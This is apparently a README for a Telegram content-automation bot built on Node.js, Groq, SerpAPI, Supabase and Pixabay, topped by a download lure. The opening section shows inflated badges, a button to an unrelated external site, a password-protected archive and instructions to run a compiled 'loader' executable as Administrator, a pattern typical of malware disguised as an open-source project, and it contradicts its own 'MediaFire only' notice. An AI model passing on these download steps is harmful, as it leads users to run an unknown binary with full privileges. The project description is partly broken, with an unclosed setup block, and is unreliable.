<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# Telegram Content Automation Bot

An AI-driven Telegram automation platform that intelligently curates and publishes multi-category content — job alerts, entertainment, trending internet updates, and app highlights — while managing real-time, context-aware auto-replies within group conversations.

## 🤖 About

This bot is designed to run a Telegram channel and group with minimal manual effort. It automatically fetches, curates, and posts content across multiple categories, while also handling group interactions through smart auto-replies — turning content management into a largely hands-off process.

## ✨ Features

- Automated content posting across multiple categories:
  - 📢 Job alerts
  - 🎬 Entertainment updates
  - 🌐 Trending internet content
  - 📱 App highlights and videos
- Smart, context-aware auto-replies in Telegram groups
- Category switching on demand
- Image sourcing for posts
- Scalable, modular workflow design

## 🛠️ Tech Stack

- **Backend:** Node.js
- **AI / Content Intelligence:** Groq API
- **Search & Data Retrieval:** SerpAPI
- **Database:** Supabase
- **Media Sourcing:** Pixabay API
- **Workflow Automation:** n8n

## ⚙️ How It Works

1. The bot fetches relevant content for a selected category using SerpAPI
2. Groq API processes and refines the content for posting
3. Pixabay API sources relevant images where needed
4. Supabase stores post history and configuration data
5. The bot posts the final content to the Telegram channel
6. In the group, incoming messages are monitored and answered automatically using context-aware replies

## 📁 Project Structure

```
telegram-bot/
├── src/
│   ├── categories/       # Content category handlers (jobs, entertainment, etc.)
│   ├── services/         # API integrations (Groq, SerpAPI, Pixabay, Supabase)
│   ├── bot/              # Telegram bot logic (posting, auto-reply)
│   └── config/           # Environment and configuration files
├── workflows/            # n8n workflow exports (if applicable)
├── package.json
└── README.md
```

## 🚀 Getting Started

1. Clone the repository
   ```
## 🔑 Environment Variables

```
TELEGRAM_BOT_TOKEN=
GROQ_API_KEY=
SERPAPI_KEY=
SUPABASE_URL=
SUPABASE_KEY=
PIXABAY_API_KEY=
```

## 📌 Roadmap

- [ ] Add voice-command category switching
- [ ] Add analytics dashboard for post performance
- [ ] Expand auto-reply intelligence with conversation memory
- [ ] Add scheduling for time-based posting

## 📬 Contact

For questions or suggestions related to this project, feel free to open an issue in this repository.

---
Built to make Telegram content management smarter and simpler.
